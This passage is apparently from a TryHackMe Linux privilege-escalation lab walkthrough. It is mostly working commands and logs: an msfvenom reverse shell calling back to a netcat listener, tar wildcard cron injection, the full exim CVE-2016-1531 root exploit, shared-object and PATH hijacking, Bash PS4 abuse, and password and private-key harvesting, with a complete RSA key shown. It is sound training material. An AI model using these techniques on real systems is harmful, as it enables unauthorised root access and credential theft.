When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

`nc -nvlp 4444`

Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:

`rm /home/user/shell.elf`  
`rm /home/user/--checkpoint=1`  
`rm /home/user/--checkpoint-action=exec=shell.elf`

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Note that one of the crontab scripts contain a wildcard in our `/home/user` directory

```bash
user@debian:~/tools/sudo$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
user@debian:~/tools/sudo$ 
```

This can be exploited with the tar checkpoint feature.

First, we create a reverse shell with Metasploits msfvenom

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.144.77 LPORT=12345 -f elf -o shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell.elf
```

That we transfer with scp to the target machine

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ scp shell.elf user@10.65.167.239:                
Unable to negotiate with 10.65.167.239 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
scp: Connection closed

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ scp -oHostKeyAlgorithms=+ssh-rsa shell.elf user@10.65.167.239:
user@10.65.167.239's password: 
shell.elf                                                                                                                                                                  100%  194     1.7KB/s   00:00  
```

We also create a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...

```

At the target machine, we setup the attack

```bash
user@debian:~$ ls
myvpn.ovpn  shell.elf  tools
user@debian:~$ ls -l
total 12
-rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn
-rwxr-xr-x 1 user user  194 Feb 14 05:49 shell.elf
drwxr-xr-x 8 user user 4096 May 15  2020 tools
user@debian:~$ chmod +x shell.elf 
user@debian:~$ touch /home/user/--checkpoint=1
user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
user@debian:~$ ls -l
total 12
-rw-r--r-- 1 user user    0 Feb 14 05:52 --checkpoint=1
-rw-r--r-- 1 user user    0 Feb 14 05:52 --checkpoint-action=exec=shell.elf
-rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn
-rwxr-xr-x 1 user user  194 Feb 14 05:49 shell.elf
drwxr-xr-x 8 user user 4096 May 15  2020 tools
user@debian:~$ 
```

Then we wait for a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.144.77] from (UNKNOWN) [10.65.167.239] 60137
id
uid=0(root) gid=0(root) groups=0(root)
hostname
debian
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
exit

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ 
```

---------------------------------------------------------------------------------------

### Task 11: SUID / GUID Executables - Known Exploits

Find all the SUID/SGID executables on the Debian VM:

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

Note that `/usr/sbin/exim-4.84-3` appears in the results. Try to find a known exploit for this version of exim. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!

A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at `/home/user/tools/suid/exim/cve-2016-1531.sh`.

Run the exploit script to gain a root shell:

`/home/user/tools/suid/exim/cve-2016-1531.sh`

**Remember to exit out of the root shell before continuing!**

---------------------------------------------------------------------------------------

#### Read and follow along with the above

```bash
user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
user@debian:~$ cd tools/suid/exim/
user@debian:~/tools/suid/exim$ ls -l
total 4
-rwxr-xr-x 1 user user 643 May 15  2017 cve-2016-1531.sh
user@debian:~/tools/suid/exim$ cat cve-2016-1531.sh 
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
user@debian:~/tools/suid/exim$ ./cve-2016-1531.sh 
[ CVE-2016-1531 local root exploit
sh-4.1# id
uid=0(root) gid=1000(user) groups=0(root)
sh-4.1# exit
exit
root.pm did not return a true value.
BEGIN failed--compilation aborted.
exim: error in perl_startup code: root.pm did not return a true value.
BEGIN failed--compilation aborted
user@debian:~/tools/suid/exim$ 
```

---------------------------------------------------------------------------------------

### Task 12: SUID / GUID Executables - Shared Object Injection

The `/usr/local/bin/suid-so` SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:

`/usr/local/bin/suid-so`

Run `strace` on the file and search the output for open/access calls and for "no such file" errors:

`strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"`

Note that the executable tries to load the `/home/user/.config/libcalc.so` shared object within our home directory, but it cannot be found.

Create the **.config** directory for the `libcalc.so` file:

`mkdir /home/user/.config`

Example shared object code can be found at `/home/user/tools/suid/libcalc.c`. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

Execute the **suid-so** executable again, and note that this time, instead of a progress bar, we get a root shell.

`/usr/local/bin/suid-so`

**Remember to exit out of the root shell before continuing!**

---------------------------------------------------------------------------------------

#### Read and follow along with the above

```bash
user@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
user@debian:~$ mkdir /home/user/.config
user@debian:~$ cat /home/user/tools/suid/libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
user@debian:~$ ls -l .config/libcalc.so 
-rwxr-xr-x 1 user user 6134 Feb 14 06:08 .config/libcalc.so
user@debian:~$ suid-so
Calculating something, please wait...
bash-4.1# id
uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# exit
exit
[=====================================================================>] 99 %
Done.
user@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 13: SUID / GUID Executables - Environment Variables

The `/usr/local/bin/suid-env` executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the **apache2** webserver:

`/usr/local/bin/suid-env`

Run strings on the file to look for strings of printable characters:

`strings /usr/local/bin/suid-env`

One line ("service apache2 start") suggests that the **service** executable is being called to start the webserver, however the full path of the executable (`/usr/sbin/service`) is not being used.

Compile the code located at `/home/user/tools/suid/service.c` into an executable called service. This code simply spawns a Bash shell:

`gcc -o service /home/user/tools/suid/service.c`

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the **suid-env** executable to gain a root shell:

`PATH=.:$PATH /usr/local/bin/suid-env`

**Remember to exit out of the root shell before continuing!**

---------------------------------------------------------------------------------------

#### Read and follow along with the above

```bash
user@debian:~$ /usr/local/bin/suid-env
[....] Starting web server: apache2httpd (pid 1851) already running
. ok 
user@debian:~$ strings -n 6 /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fffff.
service apache2 start
user@debian:~$ cat /home/user/tools/suid/service.c
int main() {
        setuid(0);
        system("/bin/bash -p");
}
user@debian:~$ gcc -o service /home/user/tools/suid/service.c
user@debian:~$ ls -l service 
-rwxr-xr-x 1 user user 6697 Feb 14 06:14 service
user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:~# exit
exit
user@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 14: SUID / GUID Executables - Abusing Shell Features (#1)

The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except that it uses the absolute path of the service executable (`/usr/sbin/service`) to start the **apache2** webserver.

Verify this with strings:

`strings /usr/local/bin/suid-env2`

In Bash versions **<4.2-048** it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:

`/bin/bash --version`

Create a Bash function with the name "**/usr/sbin/service**" that executes a new Bash shell (using `-p` so permissions are preserved) and export the function:

`function /usr/sbin/service { /bin/bash -p; }`  
`export -f /usr/sbin/service`

Run the **suid-env2** executable to gain a root shell:

`/usr/local/bin/suid-env2`

**Remember to exit out of the root shell before continuing!**

---------------------------------------------------------------------------------------

#### Read and follow along with the above

```bash
user@debian:~$ strings -n 6 /usr/local/bin/suid-env2 
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fffff.
/usr/sbin/service apache2 start
user@debian:~$ /bin/bash --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
user@debian:~$ function /usr/sbin/service { /bin/bash -p; }
user@debian:~$ export -f /usr/sbin/service
user@debian:~$ suid-env2
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:~# exit
exit
user@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 15: SUID / GUID Executables - Abusing Shell Features (#2)

**Note**: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.

Run the `/usr/local/bin/suid-env2` executable with bash debugging enabled and the **PS4** variable set to an embedded command which creates an SUID version of /bin/bash:

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Run the `/tmp/rootbash` executable with `-p` to gain a shell running with root privileges:

`/tmp/rootbash -p`

Remember to remove the `/tmp/rootbash` executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

`rm /tmp/rootbash`  
`exit`

---------------------------------------------------------------------------------------

#### Read and follow along with the above

```bash
user@debian:~$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/usr/sbin/service apache2 start
basename /usr/sbin/service
VERSION='service ver. 0.91-ubuntu1'
basename /usr/sbin/service
USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
SERVICE=
ACTION=
SERVICEDIR=/etc/init.d
OPTIONS=
'[' 2 -eq 0 ']'
cd /
'[' 2 -gt 0 ']'
case "${1}" in
'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
'[' 2 -eq 2 -a start = --full-restart ']'
'[' -z '' ']'
SERVICE=apache2
shift
'[' 1 -gt 0 ']'
case "${1}" in
'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
'[' 1 -eq 2 -a '' = --full-restart ']'
'[' -z apache2 ']'
'[' -z '' ']'
ACTION=start
shift
'[' 0 -gt 0 ']'
'[' -r /etc/init/apache2.conf ']'
'[' -x /etc/init.d/apache2 ']'
exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
Starting web server: apache2httpd (pid 1851) already running
.
user@debian:~$ ls -l /tmp/rootbash 
-rwsr-sr-x 1 root root 926536 Feb 14 06:25 /tmp/rootbash
user@debian:~$ /tmp/rootbash -p
rootbash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
rootbash-4.1# rm /tmp/rootbash
rootbash-4.1# exit
exit
user@debian:~$ 
```

---------------------------------------------------------------------------------------

### Task 16: Passwords & Keys - History Files

If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:

`cat ~/.*history | less`

Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is **no space** between the `-p` option and the password!

Switch to the root user, using the password:

`su root`

**Remember to exit out of the root shell before continuing!**

---------------------------------------------------------------------------------------

#### What is the full mysql command the user executed?

```bash
user@debian:~$ ls -l ~/.*history
-rw------- 1 user user 266 Feb 14 06:25 /home/user/.bash_history
-rw------- 1 user user 332 Feb 14 03:51 /home/user/.mysql_history
-rw------- 1 user user  11 May 15  2020 /home/user/.nano_history
user@debian:~$ cat ~/.*history | more
ls -al
cat .bash_history 
ls -al
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp
clear
ifconfig
netstat -antp
nano myvpn.ovpn 
ls
id
rm /tmp/rootbash
exit
id
rm /tmp/rootbash
rm ~/overwrite.sh 
exit
id
exit
id
exit
id
exit
id
exit
id
rm /tmp/rootbash
exit
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
identify


user@debian:~$ 
```

Answer: `mysql -h somehost.local -uroot -ppassword123`

---------------------------------------------------------------------------------------

### Task 17: Passwords & Keys - Config Files

Config files often contain passwords in plaintext or other reversible formats.

List the contents of the user's home directory:

`ls /home/user`

Note the presence of a **myvpn.ovpn** config file. View the contents of the file:

`cat /home/user/myvpn.ovpn`

The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:

`su root`

Remember to exit out of the root shell before continuing!

---------------------------------------------------------------------------------------

#### What file did you find in the root user's credentials in?

```bash
user@debian:~$ ls -la
total 72
drwxr-xr-x 6 user user 4096 Feb 14 06:14 .
drwxr-xr-x 3 root root 4096 May 15  2017 ..
-rw------- 1 user user  266 Feb 14 06:25 .bash_history
-rw-r--r-- 1 user user  220 May 12  2017 .bash_logout
-rw-r--r-- 1 user user 3235 May 14  2017 .bashrc
drwxr-xr-x 2 user user 4096 Feb 14 06:08 .config
drwxr-xr-x 2 user user 4096 May 13  2017 .irssi
drwx------ 2 user user 4096 May 15  2020 .john
-rw------- 1 user user  137 May 15  2017 .lesshst
-rw------- 1 user user  332 Feb 14 03:51 .mysql_history
-rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn
-rw------- 1 user user   11 May 15  2020 .nano_history
-rw-r--r-- 1 user user  725 May 13  2017 .profile
-rwxr-xr-x 1 user user 6697 Feb 14 06:14 service
drwxr-xr-x 8 user user 4096 May 15  2020 tools
-rw------- 1 user user 6695 Feb 14 05:35 .viminfo
user@debian:~$ cat myvpn.ovpn 
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

user@debian:~$ cat /etc/openvpn/auth.txt 
root
password123
user@debian:~$ 
```

Answer: `/etc/openvpn/auth.txt`

---------------------------------------------------------------------------------------

### Task 18: Passwords & Keys - SSH Keys

Sometimes users make backups of important files but fail to secure them with the correct permissions.

Look for hidden files & directories in the system root:

`ls -la /`

Note that there appears to be a hidden directory called **.ssh**. View the contents of the directory:

`ls -l /.ssh`

Note that there is a world-readable file called **root_key**. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.

Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:

`chmod 600 root_key`

Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):

`ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.65.167.239`

**Remember to exit out of the root shell before continuing!**

---------------------------------------------------------------------------------------

#### Read and follow along with the above

Search for SSH keys

```bash
user@debian:~$ ls -la /
total 96
drwxr-xr-x 22 root root  4096 Aug 25  2019 .
drwxr-xr-x 22 root root  4096 Aug 25  2019 ..
drwxr-xr-x  2 root root  4096 Aug 25  2019 bin
drwxr-xr-x  3 root root  4096 May 12  2017 boot
drwxr-xr-x 12 root root  2820 Feb 14 03:25 dev
drwxr-xr-x 67 root root  4096 Feb 14 06:34 etc
drwxr-xr-x  3 root root  4096 May 15  2017 home
lrwxrwxrwx  1 root root    30 May 12  2017 initrd.img -> boot/initrd.img-2.6.32-5-amd64
drwxr-xr-x 12 root root 12288 May 14  2017 lib
lrwxrwxrwx  1 root root     4 May 12  2017 lib64 -> /lib
drwx------  2 root root 16384 May 12  2017 lost+found
drwxr-xr-x  3 root root  4096 May 12  2017 media
drwxr-xr-x  2 root root  4096 Jun 11  2014 mnt
drwxr-xr-x  2 root root  4096 May 12  2017 opt
dr-xr-xr-x 96 root root     0 Feb 14 03:23 proc
drwx------  5 root root  4096 May 15  2020 root
drwxr-xr-x  2 root root  4096 May 13  2017 sbin
drwxr-xr-x  2 root root  4096 Jul 21  2010 selinux
drwxr-xr-x  2 root root  4096 May 12  2017 srv
drwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh
drwxr-xr-x 13 root root     0 Feb 14 03:23 sys
drwxrwxrwt  2 root root  4096 Feb 14 06:41 tmp
drwxr-xr-x 11 root root  4096 May 13  2017 usr
drwxr-xr-x 14 root root  4096 May 13  2017 var
lrwxrwxrwx  1 root root    27 May 12  2017 vmlinuz -> boot/vmlinuz-2.6.32-5-amd64
user@debian:~$ cd /.ssh
user@debian:/.ssh$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Aug 25  2019 .
drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
-rw-r--r--  1 root root 1679 Aug 25  2019 root_key
user@debian:/.ssh$ cat root_key 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
-----END RSA PRIVATE KEY-----
user@debian:/.ssh$ 
```

Copy the key data to our Kali machine and use it to access the machine

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ vi root_key        

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ cat root_key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
-----END RSA PRIVATE KEY-----


┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ chmod 600 root_key  

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Linux_PrivEsc]
└─$ ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.65.167.239
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

